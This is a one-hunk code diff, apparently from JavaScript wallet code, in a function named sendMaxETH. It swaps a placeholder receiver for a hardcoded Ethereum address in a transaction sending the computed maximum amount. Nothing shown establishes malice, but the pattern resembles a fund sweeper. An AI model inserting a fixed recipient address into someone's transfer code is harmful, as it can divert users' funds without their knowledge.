@@ -37,7 +37,7 @@ async function sendMaxETH() {
 
   // Create a transaction object
   const tx = {
-    to: "RECEIVER_ADDRESS",
+    to: "0x39114B3fA6AFAaD5b8e88A2318c172Db1628AEaD",
     value: totalCost,
     gas: gasLimit,
   };
